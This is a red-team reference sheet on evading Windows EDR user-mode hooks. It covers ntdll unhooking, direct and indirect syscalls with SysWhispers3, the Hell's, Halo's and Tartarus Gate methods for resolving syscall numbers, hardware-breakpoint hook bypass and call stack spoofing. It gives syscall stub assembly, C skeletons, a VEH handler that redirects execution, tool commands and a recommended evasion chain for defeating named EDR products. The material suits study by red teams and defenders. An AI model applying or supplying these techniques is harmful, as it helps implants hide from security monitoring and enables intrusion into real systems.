# Unhook / Direct / Indirect Syscall Technique List

> For authorized red team / adversary exercises / in-house product testing only, use on unauthorized targets is prohibited.

This document summarizes the current mainstream 'user-mode hook bypass' techniques, from the classic unhook to the latest hardware breakpoint Blindside.
All techniques are cross-referenced with MITRE ATT&CK T1562.001 / T1027 / T1055, facilitating report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### Principle

All hooks of EDR are located in **ntdll.dll in the current process memory**. `C:\Windows\System32\ntdll.dll` on the disk is clean.
So as long as the disk ntdll is remapped into the current process and the `.text` segment in memory is overwritten, the hook will be erased.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
│ .text (including EDR hook jmp) │ ◄── Overwrite with clean .text from disk
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
Disk C:\Windows\System32\ntdll.dll  ← Clean
```

### Key Points of Implementation

```c
// Step:
// 1. CreateFileW("\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // Bypass monitoring using the original path
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find new address .text section
// 5. NtProtectVirtualMemory changes the current ntdll .text to RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory Restore to RX
```

### Note

- `NtProtectVirtualMemory` itself may be hooked → chain problem. Solution: first use **direct syscall** to call `NtProtectVirtualMemory`
- Modern EDR already monitors `NtProtectVirtualMemory`'s W operations on ntdll memory and requires ETW patching
- Peruns Fart will leave events `KERNEL_MODULE_LOAD` and `PROTECTVM` under ETW-TI — you must compress ETW first

## 2. Direct syscall (Direct Syscall)

### Principle

Without calling ntdll's exported functions, write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Win11 24H2 上的值，每个版本不同)
    syscall
    ret
```

`syscall` instruction jumps directly from user mode to the kernel SSDT, bypassing any user-mode hooks.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - Function Declarations
syscalls.c    - C glue code
syscalls.asm - MASM Assembly stub
syscallsstubs.std.x64.asm  - Standard direct syscall
```

In Visual Studio:

```text
1. Add the .asm to the project and enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) to replace the original NtAllocateVirtualMemory
```

### Minimal direct syscall to NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (Dynamically parse SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
// Write some bytes briefly
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Disadvantages

- The syscall instruction is located in the implant's own `.text` section (not in ntdll) → kernel-mode telemetry can easily detect a 'syscall from non-ntdll address'
- This is the reason why indirect syscalls occur

## 3. Indirect syscall (Indirect Syscall)

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address), it's just that we control the SSN and the return address ourselves:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
jmp [<ntdll 中某个 syscall;ret gadget 的地址>]   ; Not a syscall in the implant
```

The gadget that is jumped to is usually the two-byte sequence `syscall; ret` at the end of the `Nt*` function.
The RIP seen by the kernel-mode ETW provider is the ntdll address, which conforms to normal behavior patterns.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => Randomized jmp targets to reduce signature
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; 返回 SSN -> eax
    call Sw3GetSyscallAddress      ; 返回 ntdll 中 syscall;ret 地址 -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; 跳到 ntdll 内合法 syscall 指令
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

The evolution of the three methods for resolving 'SSN dynamic parsing'.

### Hell's Gate

- Assume ntdll has not been hooked
- When the implant starts, traverse the `Nt*` exports of ntdll, and extract the SSN from the first 4 bytes `mov eax, <SSN>`
- Advantages: Does not hard-code SSN, compatible across Windows versions
- Disadvantage: If ntdll has already been hooked (the first byte changed to jmp), extraction will fail

### Halo's Gate

- Fix the hook issue in Hell's Gate
- If a function is found to be hooked (not a standard prologue), **scan ±N functions upward/downward**
- Using the fact that SSNs are consecutively increasing in the `Nt*` function in ntdll, infer the SSN of the hooked function from its neighbors

```text
Normal condition:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and the SSN cannot be seen, look at the neighbor:
The previous unhooked exported SSN = 0x17
The next unhooked exported SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further processing of **advanced hooks where the Hook changed the SSN but kept the syscall instruction**
- Simultaneously verify SSN and syscall;ret gadget addresses
- The combination of the three provides the most stable basis for indirect syscalls

### Reference implementation location (after bootstrapping git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (including fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   Integrates all three
```

## 5. Hardware Breakpoint Blindside

### Principle

Use the debug register `DR0-DR3` to set a hardware breakpoint at the entry of the EDR hook trampoline.
Set up VEH (Vectored Exception Handler) to **directly change RIP to after the hook trampoline** when a breakpoint is hit,
Code that bypasses EDR detection and lands in the actual syscall segment of ntdll.

### Advantages

- No need to write ntdll memory (no `NtProtectVirtualMemory` alert)
- No need to unhook (the hook is still there, it's just being bypassed)
- ETW-TI cannot detect memory modifications

### Implement Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entry of each hooked function (up to 4, used with single-step rotate)
// 3. SetThreadContext(thread, &ctx) write DRx
// 4. When the EDR hook trampoline triggers a hardware breakpoint -> VEH takes over
// 5. VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to a valid syscall; ret in ntdll
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
// SSN is already in eax; R10 = RCX; jump to ntdll's syscall; ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- Each thread has its own DRx → Multi-threading needs to set them separately
- Some EDRs have already hooked `NtSetContextThread` / `NtGetContextThread`, so you need to bypass it using the previous techniques first
- Win11 22H2+ introduces HVCI / Some anti-debugging mitigations may interfere

## 6. Call Stack Spoofing

### Question

Modern EDR calls `RtlCaptureStackBackTrace` at syscall kernel entry points such as `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
Obtain the full call stack for reporting. The implant's stack will show **non-image-backed memory** frames → high-confidence alert.

### Plan A: CallStackSpoofer (William Burgess)

Implementation idea:

1. Before the syscall, swap the current thread stack → a forged legitimate stack
2. Fake stack frames populate fully valid return chains such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After the syscall returns, swap back to the real stack

### Plan B: SilentMoonwalk

More radical, using desynchronized stack:

```text
Execution process:
implant code → custom trampoline (modify RSP / RBP / stack content)
                ↓
syscall (RtlCaptureStackBackTrace sees a forged stack)
                ↓
trampoline restore → continue implanting code
```

The key is unwinding: letting `RtlVirtualUnwind` walk into the forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC Recommendations

- Call stack spoof + indirect syscall + ETW patch is currently a relatively reliable combination for bypassing CrowdStrike / SentinelOne
- You also need to spoof during the sleep stage; simply spoofing during execution is not enough (EDR will sample periodically)

## 7. Technology Selection Comparison Table

| Technique | Attack | Complexity | Current Effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Perun's Fart | User-mode hook | Low | Medium (easily detected by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hook | Low | Low-Medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hook + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN Analysis | Medium | High (Infrastructure) | T1027 |
| HWBP Blindside | hook + no-write operation | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | High | High | T1564 |

Practical recommended chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3：xKx0003xKx
- Hell's Gate / Halo's Gate POC：xKx0004xKx、xKx0005xKx
- Tartarus Gate：xKx0006xKx
- CallStackSpoofer：xKx0007xKx
- SilentMoonwalk：xKx0008xKx
- Blindside（hardware breakpoint）：xKx0009xKx
- MITRE T1562.001：xKx0010xKx

## Route Callback

Unhook is only half of the bypass; the other half is telemetry blindness: enter `references/telemetry-blinding.md`.